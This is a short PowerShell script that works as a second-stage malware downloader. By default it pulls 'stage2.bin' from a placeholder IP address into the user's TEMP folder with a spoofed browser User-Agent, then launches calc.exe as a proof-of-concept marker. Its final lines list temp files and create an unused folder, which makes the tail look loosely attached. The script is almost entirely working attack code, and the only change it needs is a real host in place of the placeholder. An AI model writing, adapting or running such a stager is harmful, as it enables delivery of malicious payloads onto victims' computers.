
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://198.51.100.73/stage2.bin',
    [string]$LocalPath = "$env:TEMP\payload.bin",
    [int]$StageTimeout = 145,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Get-Stage2Payload -SourceUrl $FetchUrl -DestinationPath $LocalPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
